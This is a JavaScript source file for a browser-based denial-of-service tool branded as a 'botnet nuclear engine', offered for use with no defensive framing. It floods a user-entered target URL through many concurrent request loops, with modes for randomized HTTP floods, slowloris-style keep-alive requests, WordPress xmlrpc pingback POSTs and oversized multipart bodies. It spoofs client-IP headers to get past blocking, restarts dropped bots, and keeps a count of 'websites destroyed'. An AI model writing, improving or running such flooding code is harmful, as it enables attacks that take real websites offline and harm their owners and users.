// ============================================
// 💀 REYY.X - BOTNET NUCLEAR ENGINE
// ============================================

let isAttacking = false;
let totalRequests = 0, successCount = 0, startTime = null, bandwidthUsed = 0, victimCount = 0;
let activeBots = [], attackInterval = null;

const targetUrlInput = document.getElementById('targetUrl');
const botCountInput = document.getElementById('botCount');
const threadsPerBotInput = document.getElementById('threadsPerBot');
const delayInput = document.getElementById('delay');
const attackModeSelect = document.getElementById('attackMode');
const intensitySlider = document.getElementById('intensity');
const autoRegenCheck = document.getElementById('autoRegen');
const startBtn = document.getElementById('startBtn');
const stopBtn = document.getElementById('stopBtn');

const totalRequestsSpan = document.getElementById('totalRequests');
const requestsPerSecSpan = document.getElementById('requestsPerSec');
const successRateSpan = document.getElementById('successRate');
const durationSpan = document.getElementById('duration');
const uniqueIPsSpan = document.getElementById('uniqueIPs');
const bandwidthSpan = document.getElementById('bandwidth');
const activeBotsSpan = document.getElementById('activeBots');
const totalBotThreadsSpan = document.getElementById('totalBotThreads');
const logContent = document.getElementById('logContent');

function addLog(message, type='info') {
    const logEntry = document.createElement('div');
    logEntry.className = `log-entry ${type}`;
    logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
    logContent.appendChild(logEntry);
    logContent.scrollTop = logContent.scrollHeight;
}

document.getElementById('clearLog')?.addEventListener('click', () => { logContent.innerHTML = ''; addLog('Log cleared!','warning'); });

async function sendRequest(target, mode, timeout, botId) {
    if(!isAttacking) return;
    const url = new URL(target);
    const fakeIP = generateRandomIP();
    const ipHeaders = generateIPHeaders();
    const location = generateRandomLocation();
    
    let finalUrl = target;
    let fetchOptions = {
        method: 'GET',
        headers: {
            'User-Agent': randomFromArray(CONFIG.userAgents),
            'Accept': '*/*',
            'X-Forwarded-For': ipHeaders['X-Forwarded-For'],
            'X-Real-IP': ipHeaders['X-Real-IP'],
            'CF-Connecting-IP': ipHeaders['CF-Connecting-IP'],
            'True-Client-IP': ipHeaders['True-Client-IP'],
            'X-Bot-ID': `BOT-${botId}`,
            'Referer': randomFromArray(CONFIG.referers),
            'Cache-Control': 'no-cache'
        },
        signal: AbortSignal.timeout(timeout * 1000)
    };
    
    switch(mode) {
        case 'http':
            finalUrl = `${url.origin}${randomFromArray(CONFIG.paths)}?${randomString(8)}=${Date.now()}`;
            break;
        case 'slowloris':
            fetchOptions.method = 'HEAD';
            fetchOptions.headers['Connection'] = 'keep-alive';
            break;
        case 'xmlrpc':
            finalUrl = `${url.origin}/xmlrpc.php`;
            fetchOptions.method = 'POST';
            fetchOptions.headers['Content-Type'] = 'text/xml';
            fetchOptions.body = '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName></methodCall>';
            break;
        case 'multipart':
            fetchOptions.method = 'POST';
            const boundary = `----WebKitFormBoundary${randomString(16)}`;
            fetchOptions.headers['Content-Type'] = `multipart/form-data; boundary=${boundary}`;
            let body = '';
            for(let i=0;i<50;i++) body += `--${boundary}\r\nContent-Disposition: form-data; name="f${i}"\r\n\r\n${randomString(200)}\r\n`;
            body += `--${boundary}--`;
            fetchOptions.body = body;
            break;
        case 'nuclear':
        default:
            finalUrl = `${url.origin}${randomFromArray(CONFIG.paths)}?${randomString(10)}=${Date.now()}&_=${Math.random()}`;
    }
    
    try {
        const response = await fetch(finalUrl, fetchOptions);
        totalRequests++; successCount++;
        bandwidthUsed += (finalUrl.length + (fetchOptions.body?.length||0));
        return { success: true, status: response.status };
    } catch(error) {
        totalRequests++;
        bandwidthUsed += (finalUrl.length + (fetchOptions.body?.length||0));
        return { success: false, error: error.message };
    }
}

class Bot {
    constructor(id, target, mode, delay, timeout, threads) {
        this.id = id; this.target = target; this.mode = mode; this.delay = delay;
        this.timeout = timeout; this.threads = threads;
        this.alive = true; this.requests = 0; this.rps = 0;
        this.usedIPs = new Set(); this.lastUpdate = Date.now(); this.isRunning = true;
    }
    async run() {
        while(this.isRunning && this.alive && isAttacking) {
            const result = await sendRequest(this.target, this.mode, this.timeout, this.id);
            this.requests++;
            const now = Date.now();
            if(now - this.lastUpdate >= 1000) { this.rps = this.requests; this.requests = 0; this.lastUpdate = now; }
            if(!result.success && result.error === 'timeout' && Math.random()<0.05) this.alive = false;
            if(this.delay > 0) await new Promise(r => setTimeout(r, this.delay));
        }
    }
    stop() { this.isRunning = false; this.alive = false; }
}

function updateStats() {
    if(!isAttacking) return;
    const elapsed = (Date.now()-startTime)/1000;
    const rps = Math.round(totalRequests/elapsed);
    const successRate = totalRequests>0 ? Math.round((successCount/totalRequests)*100) : 0;
    const bandwidthMbps = Math.round((bandwidthUsed/elapsed)/(1024*1024)*10)/10;
    totalRequestsSpan.textContent = totalRequests.toLocaleString();
    requestsPerSecSpan.textContent = rps.toLocaleString();
    successRateSpan.textContent = `${successRate}%`;
    bandwidthSpan.textContent = `${bandwidthMbps} GB/s`;
    const uniqueIPs = activeBots.reduce((sum,b)=>sum+b.usedIPs.size,0);
    uniqueIPsSpan.textContent = uniqueIPs.toLocaleString();
    document.getElementById('uniqueIPsPanel') && (document.getElementById('uniqueIPsPanel').textContent = uniqueIPs.toLocaleString());
    const hours = Math.floor(elapsed/3600), minutes = Math.floor((elapsed%3600)/60), seconds = Math.floor(elapsed%60);
    durationSpan.textContent = `${String(hours).padStart(2,'0')}:${String(minutes).padStart(2,'0')}:${String(seconds).padStart(2,'0')}`;
    activeBotsSpan.textContent = activeBots.filter(b=>b.alive).length;
    totalBotThreadsSpan.textContent = activeBots.reduce((sum,b)=>sum+(b.alive?b.threads:0),0).toLocaleString();
    if(window.coordinator) window.coordinator.updateUI();
}

function updateBotList() {
    const container = document.getElementById('botListContent');
    if(!container) return;
    container.innerHTML = '';
    activeBots.filter(b=>b.alive).slice(0,15).forEach(bot => {
        const div = document.createElement('div');
        div.className = 'bot-item alive';
        div.innerHTML = `<span>#${bot.id}</span><span>🟢</span><span>${bot.requests}</span><span>${bot.rps}</span><span>${bot.usedIPs.size}</span>`;
        container.appendChild(div);
    });
}

setInterval(updateBotList, 1000);

async function deployBotnet() {
    let target = targetUrlInput.value.trim();
    const botCount = parseInt(botCountInput.value);
    const threadsPerBot = parseInt(threadsPerBotInput.value);
    const delay = parseInt(delayInput.value);
    const mode = attackModeSelect.value;
    
    if(!target){addLog('TARGET GAK BOLEH KOSONG!','error');return;}
    if(!target.startsWith('http')) target = 'https://'+target;
    
    addLog(`🔥 ATTACK STARTED: ${target}`, 'error');
    addLog(`🤖 ${botCount} BOTS | ${threadsPerBot} THREADS/BOT | MODE: ${mode}`, 'warning');
    
    isAttacking = true;
    startTime = Date.now();
    totalRequests = 0; successCount = 0; bandwidthUsed = 0;
    activeBots = [];
    document.getElementById('attackIndicator').style.display = 'block';
    startBtn.disabled = true; stopBtn.disabled = false;
    
    for(let i=0;i<botCount;i++) {
        const bot = new Bot(i+1, target, mode, delay, 10, threadsPerBot);
        activeBots.push(bot);
        for(let t=0;t<threadsPerBot;t++) bot.run();
        if(i%50===0) await new Promise(r=>setTimeout(r,5));
    }
    addLog(`✅ ${botCount} BOTS DEPLOYED!`, 'success');
    attackInterval = setInterval(updateStats, 1000);
    
    setInterval(()=>{
        if(isAttacking && autoRegenCheck?.checked){
            const deadBots = activeBots.filter(b=>!b.alive);
            if(deadBots.length>0){
                deadBots.forEach(bot=>{
                    const newBot = new Bot(bot.id, target, mode, delay, 10, threadsPerBot);
                    const idx = activeBots.findIndex(b=>b.id===bot.id);
                    if(idx!==-1) activeBots[idx]=newBot;
                    newBot.run();
                });
                addLog(`🔄 REGENERATED ${deadBots.length} BOTS`, 'bot');
            }
        }
    },5000);
}

function stopBotnet() {
    if(!isAttacking) return;
    isAttacking = false;
    clearInterval(attackInterval);
    document.getElementById('attackIndicator').style.display = 'none';
    victimCount++;
    document.getElementById('victimCounter').textContent = `💀 WEBSITE DESTROYED: ${victimCount}`;
    activeBots.forEach(b=>b.stop());
    const elapsed = (Date.now()-startTime)/1000;
    addLog(`🛑 STOPPED! TOTAL: ${totalRequests.toLocaleString()} REQ | RPS: ${Math.round(totalRequests/elapsed)}`, 'warning');
    startBtn.disabled = false; stopBtn.disabled = true;
}

startBtn.addEventListener('click', deployBotnet);
stopBtn.addEventListener('click', stopBotnet);
window.setTarget = (url) => { if(targetUrlInput) targetUrlInput.value = url; };
window.deployBotnet = deployBotnet;
window.stopBotnet = stopBotnet;
window.isAttacking = () => isAttacking;

addLog('💀 REYY.X BOTNET READY - SHARE LINK KE TEMEN LO!', 'error');